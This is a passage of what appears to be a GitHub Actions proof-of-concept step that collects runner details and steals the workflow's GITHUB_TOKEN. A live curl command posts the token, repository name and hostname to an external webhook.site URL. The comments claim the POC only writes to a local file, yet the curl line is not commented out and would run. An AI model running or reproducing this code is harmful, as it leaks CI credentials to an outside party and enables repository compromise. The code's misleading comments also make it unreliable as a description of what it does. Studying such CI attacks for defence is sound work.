        echo "[EXFIL] RUNNER_NAME: $RUNNER_NAME"
        echo "[EXFIL] RUNNER_TEMP: $RUNNER_TEMP"
        echo "[EXFIL] Hostname: $(hostname)"
        echo "[EXFIL] Whoami: $(whoami)"
        echo "[EXFIL] PWD: $(pwd)"
        echo ""

        # =====================================================================
        # In a real attack, the attacker would exfiltrate to their C2 server:
        curl -X POST https://webhook.site/41790893-4dac-418c-a1b6-9b0241a3ac03/exfil \
          -d "token=$GITHUB_TOKEN" \
          -d "repo=$GITHUB_REPOSITORY" \
          -d "runner=$(hostname)"
        # =====================================================================

        # For this POC, we write to a local file instead
        mkdir -p /tmp/poc-exfil
        echo "--- EXFILTRATED DATA ---" > /tmp/poc-exfil/stolen_data.txt
        echo "Timestamp: $(date -u)" >> /tmp/poc-exfil/stolen_data.txt
        echo "GITHUB_TOKEN: ${GITHUB_TOKEN:0:10}... (truncated)" >> /tmp/poc-exfil/stolen_data.txt
        echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY" >> /tmp/poc-exfil/stolen_data.txt
